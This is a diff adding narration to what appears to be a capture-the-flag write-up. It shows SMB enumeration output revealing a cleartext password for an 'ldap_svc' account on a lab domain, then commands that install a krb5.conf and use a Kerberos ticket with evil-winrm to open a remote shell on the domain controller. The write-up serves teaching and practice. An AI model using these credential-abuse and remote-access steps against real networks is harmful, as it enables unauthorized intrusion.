@@ -589,11 +589,12 @@ SMB         dc.ext.darkhaven.local 445    DC               [+] krb5 conf saved t
 SMB         dc.ext.darkhaven.local 445    DC               [+] Run the following command to use the conf file: export KRB5_CONFIG=krb5.conf
 SMB         dc.ext.darkhaven.local 445    DC               [+] ext.darkhaven.local\ldap_svc:6trfgvb**hs#@jskKFHJAh34 (Pwn3d!)
 ```
-
+First ill generate a krb5 file in my pwd
 
 ```python
 sudo cp krb5.conf /etc/krb5.conf
 ```
+Ill then use the file and replace the one in `/etc/krb5.conf`
 
 ```python
 KRB5CCNAME=ldap_svc.ccache evil-winrm -i dc.ext.darkhaven.local -r ext.darkhaven.local 
@@ -607,3 +608,4 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\ldap_svc\Documents> 
 ```
+Now i can use the TGT i got for the `ldap_svc` user and specify the realm 
